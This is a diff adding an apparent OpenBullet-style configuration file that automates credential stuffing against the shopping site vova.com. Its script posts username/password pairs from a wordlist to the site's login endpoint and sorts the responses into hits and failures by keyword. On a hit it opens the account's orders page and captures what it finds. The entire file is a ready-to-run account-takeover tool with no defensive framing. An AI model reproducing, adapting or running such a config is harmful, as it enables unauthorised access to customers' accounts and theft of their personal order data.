@@ -1,0 +1,57 @@
+[SETTINGS]
+{
+  "Name": "Vova",
+  "SuggestedBots": 15,
+  "LastModified": "2018-10-03T12:38:10.0058862+00:00",
+  "AdditionalInfo": "|Proxyless | Capture Orders|",
+  "Author": "suffocate",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [
+    {
+      "SliceName": "USER",
+      "RuleType": 2,
+      "RuleString": "5",
+      "Id": 1181015071
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 2,
+      "RuleString": "5",
+      "Id": 785419353
+    }
+  ],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://www.vova.com/ajax.php?back=https%3A%2F%2Fwww.vova.com%2F" AutoRedirect=TRUE 
+  CONTENT "act=login&login%5Bemail%5D=<USER>&login%5Bpassword%5D=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "registered" 
+    KEY "incorrect" 
+  KEYCHAIN Success OR 
+    KEY "isSendAppsData" 
+REQUEST GET "https://www.vova.com/account/orders.php" AutoRedirect=TRUE 
+  CONTENT "act=login&login%5Bemail%5D=<USER>&login%5Bpassword%5D=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" LR "\">MY ORDERS</h1><div class=\"orders-empty\">" "<" Recursive=FALSE -> CAP "|" "" "" 
